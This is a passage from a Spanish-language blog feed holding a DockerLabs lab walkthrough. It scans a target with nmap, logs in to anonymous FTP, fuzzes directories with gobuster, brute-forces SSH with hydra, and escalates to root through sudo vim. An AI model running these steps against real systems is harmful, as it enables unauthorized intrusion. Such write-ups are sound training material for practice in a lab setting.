+      <td>Combinación de opciones:  <br />• <code class="language-plaintext highlighter-rouge">-sS</code> = Escaneo <strong>SYN</strong> (rápido y sigiloso).  <br />• <code class="language-plaintext highlighter-rouge">-sC</code> = Usa <strong>scripts NSE básicos</strong>, equivalente a <code class="language-plaintext highlighter-rouge">--script=default</code>.  <br />• <code class="language-plaintext highlighter-rouge">-sV</code> = Detecta versiones de servicios.</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">--min-rate 5000</code></td>
+      <td>Intenta enviar <strong>al menos 5000 paquetes por segundo</strong> (muy rápido). ⚠️ Puede generar falsos positivos si la red no lo soporta bien.</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">-Pn</code></td>
+      <td>No hace <strong>ping previo</strong> al host (asume que está vivo). Útil si ICMP está bloqueado.</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">-n</code></td>
+      <td>No resuelve nombres DNS (más rápido).</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">-v</code></td>
+      <td>Modo <strong>verborreico</strong>: muestra más detalles durante el escaneo.</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">172.17.0.2</code></td>
+      <td>IP del objetivo.</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">-oN escaneo</code></td>
+      <td>Guarda el resultado en un archivo llamado <code class="language-plaintext highlighter-rouge">escaneo</code> en formato <strong>legible para humanos</strong> (normal output).</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>El escaneo nos muestra que esta maquina tiene 3 puertos abiertos.</p>
+
+<ul>
+  <li>Puerto 21 FTP version vsftpd 3.0.5</li>
+  <li>Puerto 22 SSH en la versión <strong>9.6</strong></li>
+  <li>Puerto 80 donde esta corriendo un servicio <strong>Http</strong></li>
+</ul>
+
+<p><img src="image.png" alt="alt text" /></p>
+
+<p>Podemos observar que el puerto 21 tiene el login de anónimo habilitado <strong>FTP code 230</strong> por lo cual podríamos entrar a revisar y ver que nos podemos encontrar. Para ello pondremos el siguiente comando: <code class="language-plaintext highlighter-rouge">ftp 172.17.0.2</code>, nos pedirá un usuario le ponemos <strong>anonymous</strong> y password lo dejamos en blanco.</p>
+
+<p><img src="image-2.png" alt="alt text" /></p>
+
+<p>Al entrar y hacer el comando <code class="language-plaintext highlighter-rouge">ls</code> podemos ver que hay 2 archivos.txt.</p>
+
+<ul>
+  <li>chat-gonza.txt</li>
+  <li>pendientes.txt</li>
+</ul>
+
+<p>Descargaremos estos 2 archivos a nuestra maquina atacante con el comando <strong>mget</strong>. Los comandos serian:</p>
+
+<p><code class="language-plaintext highlighter-rouge">mget chat-gonza.txt</code>
+<code class="language-plaintext highlighter-rouge">mget pendientes.txt</code></p>
+
+<p><img src="image-3.png" alt="alt text" /></p>
+
+<p>Puede que algunas personas confundan el comando <strong>mget</strong> con el <strong>wget</strong> pero no son lo  mismo.</p>
+
+<h2 id="-diferencia-principal">🎯 Diferencia principal:</h2>
+
+<table>
+  <thead>
+    <tr>
+      <th>Comando</th>
+      <th>Herramienta</th>
+      <th>Función principal</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">wget</code></td>
+      <td>Shell (Linux/Unix)</td>
+      <td>Descarga archivos desde la web (HTTP, HTTPS, FTP)</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">mget</code></td>
+      <td>Cliente FTP interactivo</td>
+      <td>Descarga <strong>múltiples archivos</strong> desde un servidor FTP</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Una vez descargado los archivos, los revisamos. el archivo <strong>chat-gonza.txt</strong> parece una conversación de chat entre 3 personas. De este archivo podemos rescatar esos 3 posibles usuarios.</p>
+
+<ul>
+  <li>Gonza</li>
+  <li>Russoski</li>
+  <li>nagore</li>
+</ul>
+
+<p>El segundo archivo <strong>pendientes.txt</strong> contiene como una lista de cosas por hacer donde el punto 4 llama la atención donde dice lo siguiente: <strong><em>Cambiar algunas configuraciones de mi equipo, creo que tengo ciertos permisos habilitados que no son del todo seguros..</em></strong></p>
+
+<p><img src="image-4.png" alt="alt text" /></p>
+
+<p>Revisaremos el puerto 80 para ver que http se esta corriendo por detrás. Al parecer nos encontramos con una pagina de fitness o algo por el estilo.</p>
+
+<p><img src="image-5.png" alt="alt text" /></p>
+
+<p>La pagina contiene un formulario que al llenar los datos te redirige a la siguiente pagina.</p>
+
+<p><img src="image-6.png" alt="alt text" /></p>
+
+<p><img src="image-7.png" alt="alt text" /></p>
+
+<p>Revisando a mas detalle esta pagina tiene un enlace que dice <strong>entrar aquí</strong> que nos lleva a otra pagina.</p>
+
+<p><img src="image-8.png" alt="alt text" /></p>
+
+<p>Al revisar el código fuente de las paginas en una encontramos el siguiente mensaje.</p>
+
+<p><strong><em>&lt;! – Utilizando el mismo usuario para todos mis servicios, podré recordarlo fácilmente –&gt;</em></strong></p>
+
+<p>Entonces según esta nota el nombre de usuario <strong>Russoski</strong> esta ligado a varios servicios.</p>
+
+<p><img src="image-9.png" alt="alt text" /></p>
+
+<p>Ahora utilizaremos la herramienta <strong>gobuster</strong> para hacer fuzzing y ver si hay directorios ocultos. Para ello usaremos el siguiente comando:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,sh
+</code></pre></div></div>
+
+<p>Encontramos 2 directorios interesantes:</p>
+
+<ul>
+  <li>backup</li>
+  <li>important</li>
+</ul>
+
+<p><img src="image-10.png" alt="alt text" /></p>
+
+<p>al revisar el <strong>backup</strong> nos muestra lo siguiente. un menu de apache con una ruta llamada <strong>backup.txt</strong></p>
+
+<p><img src="image-11.png" alt="alt text" /></p>
+
+<p>Al entrar a la ruta backup nos muestra el siguiente mensaje donde se confirma que el usuario <strong>russoski</strong> es el mismo para todos los servicios.</p>
+
+<p><img src="image-12.png" alt="alt text" /></p>
+
+<p>Al revisar el segundo directorio <strong>important</strong> nos lleva al mismo menu de apache. con una ruta llamada <strong>important.md</strong></p>
+
+<p><img src="image-13.png" alt="alt text" /></p>
+
+<p>al entrar en la ruta nos muestra el siguiente texto. nada relevante…</p>
+
+<p><img src="image-14.png" alt="alt text" /></p>
+
+<p>Procederemos a usar la herramienta hydra y probar en hacer fuerza bruta con el usuario <strong>russoski</strong> al puerto 22 SSH. Para ello usaremos el siguiente comando:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hydra -l russoski -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2
+</code></pre></div></div>
+
+<p>Se encontro la password que coincide con el usuario.</p>
+
+<ul>
+  <li>user: russoski</li>
+  <li>password: iloveme</li>
+</ul>
+
+<p><img src="image-15.png" alt="alt text" /></p>
+
+<p>Pudimos acceder a la maquina victima con el usuario russoski</p>
+
+<p><img src="image-16.png" alt="alt text" /></p>
+
+<p>Al realizar un sudo -l podemos ver que podemos hacer una escalada de privilegios con <strong>Vim</strong></p>
+
+<p><img src="image-17.png" alt="alt text" /></p>
+
+<p>Consultando la pagina https://gtfobins.github.io/gtfobins/vim/#sudo nos da las instrucciones para realizar la escalada de privilegios.</p>
+
+<p><img src="image-18.png" alt="alt text" /></p>
+
+<p>Abrimos vim y ponemos lo el comando que nos sugiere la pagina.</p>
+
+<p><img src="image-19.png" alt="alt text" /></p>
+
+<p>Con esto logramos ser <strong>root</strong> en la maquina victima.</p>
+
+<p><img src="image-20.png" alt="alt text" /></p>]]></content><author><name>Mauricio López</name><email>your-email@email.com</email></author><category term="jekyll" /><category term="update" /><summary type="html"><![CDATA[En esta práctica trabajaremos con una máquina de DockerLabs donde aprovecharemos el servicio FTP abierto en el puerto 21 para acceder a la cuenta anonymous. Desde allí descargaremos documentos y archivos sensibles que nos proporcionarán pistas relevantes para avanzar en la explotación y vulneración de la máquina.]]></summary></entry></feed>
